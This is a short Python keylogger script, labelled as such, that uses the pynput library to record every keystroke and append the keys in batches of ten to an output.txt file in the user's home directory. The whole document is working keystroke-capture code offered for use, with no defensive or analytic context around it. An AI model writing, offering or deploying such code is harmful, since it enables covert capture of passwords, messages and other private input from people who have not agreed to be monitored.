# Python code for keylogger 
from pynput import keyboard
import os

count = 0
keylogs = ""
output_file = os.path.expanduser('~') + '\\output.txt'

# Check if the file exists, create it if not
if not os.path.exists(output_file):
    with open(output_file, 'w'):
        pass  # Create an empty file

def on_press(key):
    global count, keylogs
    count += 1
    keylogs += str(key) + '\n'
    if count >= 10:
        count = 0
        keylogs = keylogs.strip()
        with open(output_file, 'a') as f:
            f.write(keylogs + '\n')
        keylogs = ""

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
